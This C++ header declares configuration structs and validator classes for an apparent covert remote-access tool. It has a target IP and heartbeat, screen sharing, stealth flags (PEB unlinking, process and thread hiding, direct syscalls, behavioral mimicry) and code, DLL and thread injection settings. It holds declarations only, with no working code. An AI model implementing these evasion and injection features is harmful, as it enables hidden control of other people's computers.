#ifndef CONFIG_VALIDATOR_H
#define CONFIG_VALIDATOR_H

#include <string>
#include <vector>
#include <map>

// Configuration structs
struct NetworkConfig {
    std::string targetIP;
    int targetPort;
    bool enableEncryption;
    bool enableCompression;
    int timeoutMs;
    int heartbeatIntervalMs;
};

struct StealthConfig {
    bool enablePEBUnlinking;
    bool enableThreadHiding;
    bool enableProcessHiding;
    bool enableMemoryEncryption;
    bool enableNetworkObfuscation;
    bool enableBehavioralMimicry;
    bool enableTimingAttacks;
    bool enableDirectSyscalls;
};

struct ScreenSharingConfig {
    int quality;
    int frameRate;
    int compression;
    bool enableEncryption;
    bool enableHardwareAcceleration;
    bool enableDirectMemoryAccess;
};

struct AuthConfig {
    std::string username;
    std::string password;
    bool enableSessionManagement;
    int sessionTimeoutMinutes;
    int maxLoginAttempts;
};

struct ProcessInjectionConfig {
    std::vector<std::string> targetProcesses;
    bool enableCodeInjection;
    bool enableDLLInjection;
    bool enableThreadInjection;
    int injectionTimeoutMs;
};

struct MemoryProtectionConfig {
    bool enableEncryption;
    bool enableObfuscation;
    bool enableRandomization;
    bool enableSegmentation;
    bool enableVirtualization;
    int encryptionLevel;
    int obfuscationLevel;
};

namespace MasoudyConfig {

// Configuration validation result
enum class ValidationResult {
    VALID,          // Configuration is valid
    INVALID,        // Configuration is invalid
    WARNING,        // Configuration has warnings
    CRITICAL        // Critical configuration error
};

// Configuration section
struct ConfigSection {
    std::string name;
    std::map<std::string, std::string> settings;
    ValidationResult validationResult;
    std::vector<std::string> errors;
    std::vector<std::string> warnings;
};

// Configuration validator class
class ConfigValidator {
private:
    std::map<std::string, ConfigSection> sections;
    
    // Validation results
    std::vector<std::string> m_errors;
    std::vector<std::string> m_warnings;
    
    // Validation rules
    struct ValidationRule {
        std::string settingName;
        std::string expectedType;
        std::string minValue;
        std::string maxValue;
        std::vector<std::string> allowedValues;
        bool required;
    };
    
    std::map<std::string, std::vector<ValidationRule>> validationRules;
    
    // Helper methods
    bool validateString(const std::string& value, const ValidationRule& rule);
    bool validateInteger(const std::string& value, const ValidationRule& rule);
    bool validateBoolean(const std::string& value, const ValidationRule& rule);
    bool validateRange(const std::string& value, const ValidationRule& rule);
    bool validateEnum(const std::string& value, const ValidationRule& rule);
    void setupValidationRules();

public:
    ConfigValidator();
    ~ConfigValidator();
    
    // Configuration loading and validation
    ValidationResult validateConfiguration(const std::string& configData);
    ValidationResult validateSection(const std::string& sectionName, 
                                   const std::map<std::string, std::string>& settings);
    
    // Configuration access
    ConfigSection* getSection(const std::string& sectionName);
    std::string getSetting(const std::string& sectionName, const std::string& settingName);
    bool hasSection(const std::string& sectionName);
    
    // Validation results
    std::vector<std::string> getErrors(const std::string& sectionName = "");
    std::vector<std::string> getWarnings(const std::string& sectionName = "");
    bool hasErrors();
    bool hasWarnings();
    
    // Advanced validation methods
    bool ValidateNetworkConfiguration(const NetworkConfig& config);
    bool ValidateStealthConfiguration(const StealthConfig& config);
    bool ValidateScreenSharingConfiguration(const ScreenSharingConfig& config);
    bool ValidateAuthenticationConfiguration(const AuthConfig& config);
    bool ValidateProcessInjectionConfiguration(const ProcessInjectionConfig& config);
    bool ValidateMemoryProtectionConfiguration(const MemoryProtectionConfig& config);
    
    // Configuration generation
    NetworkConfig GenerateDefaultNetworkConfig();
    StealthConfig GenerateDefaultStealthConfig();
    ScreenSharingConfig GenerateDefaultScreenSharingConfig();
    AuthConfig GenerateDefaultAuthConfig();
    ProcessInjectionConfig GenerateDefaultProcessInjectionConfig();
    MemoryProtectionConfig GenerateDefaultMemoryProtectionConfig();
    
    // Configuration export/import
    bool ExportConfiguration(const std::string& filename);
    bool ImportConfiguration(const std::string& filename);
    std::string GetConfigurationAsJSON();
    bool LoadConfigurationFromJSON(const std::string& json);
    
    // Utility methods
    void clearValidationResults();
    std::string getValidationSummary();
    bool isConfigurationValid();
    
    // IP validation
    bool IsValidIPAddress(const std::string& ip);
    
    // Legacy methods (for backward compatibility)
    std::string generateDefaultConfig();
    std::string generateSampleConfig();
    std::string exportConfiguration();
    bool importConfiguration(const std::string& configData);
};

// Configuration manager class
class ConfigManager {
private:
    std::unique_ptr<ConfigValidator> validator;
    std::string configFilePath;
    bool configLoaded;
    
public:
    ConfigManager(const std::string& filePath = "");
    ~ConfigManager();
    
    // Configuration file operations
    bool loadConfiguration(const std::string& filePath = "");
    bool saveConfiguration(const std::string& filePath = "");
    bool createDefaultConfiguration();
    
    // Configuration validation
    ValidationResult validateCurrentConfiguration();
    bool isConfigurationValid();
    
    // Configuration access
    std::string getSetting(const std::string& section, const std::string& key, 
                          const std::string& defaultValue = "");
    bool setSetting(const std::string& section, const std::string& key, 
                   const std::string& value);
    
    // Configuration sections
    std::vector<std::string> getSections();
    std::map<std::string, std::string> getSectionSettings(const std::string& section);
    
    // Error handling
    std::vector<std::string> getErrors();
    std::vector<std::string> getWarnings();
    std::string getLastError();
    
    // Utility methods
    void resetToDefaults();
    std::string exportConfiguration();
    bool importConfiguration(const std::string& configData);
};

} // namespace MasoudyConfig

#endif // CONFIG_VALIDATOR_H 